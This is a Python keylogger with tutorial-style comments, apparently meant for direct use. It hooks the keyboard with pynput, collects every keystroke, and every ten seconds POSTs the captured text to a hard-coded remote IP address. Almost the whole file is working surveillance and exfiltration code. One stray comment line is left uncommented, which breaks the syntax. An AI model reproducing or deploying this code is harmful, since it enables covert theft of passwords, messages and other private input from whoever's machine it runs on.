# Install pynput using the following command: pip install pynput or suing Pycharm
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server using Pycharm.
import requests
#We need the json package to convert a Dictionary to a JSON string.
import json
# The threading package contains the Timer module.
import threading
# We create a global variable text to store the keystroke string that will be sent to the server.
text = ""



# Enter your server and IP address as hard codes here.
ip_address = "4.240.89.228"
port_number = "80"
# The amount of time in seconds that the code will run.
time_interval = 10

def send_post_req():
    try:
# The Python object has to be transformed into a JSON string. in order for us to POST it to the server. which will utilize to search for JSON the "keyboardData": "value of text>" format.
        payload = json.dumps({"keyboardData" : text})


# We post the request to the IP address of the server that is listening on the port that is mentioned in the Express server code.
We select application/json as the MIME Type for JSON as we are sending JSON to the server.

        request = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type" : "application/json"})

# Configuring a timer function to execute every time interval> seconds. Send post req is a recursive function that, as long as the program is running, will call itself.

        timer = threading.Timer(time_interval, send_post_req)

# The timer thread is launched.

        timer.start()
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.

def on_press(key):
    global text

# Depending on the key press, we control how the key is recorded to the string stored in memory.
# You can find out more about the various keys that may be logged here:

    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:

# We append the key object to the string that is stored in memory after doing an explicit conversion from the key object to a string.
       
        text += str(key).strip("'")

# A callback on press will be triggered by a thread created by a keyboard listener called threading.Thread.
# We defined how to handle the various inputs the listener receives in the on press function.

with keyboard.Listener(
    on_press=on_press) as listener:

# The post request is the first thing we send to our server.

    send_post_req()
    listener.join()

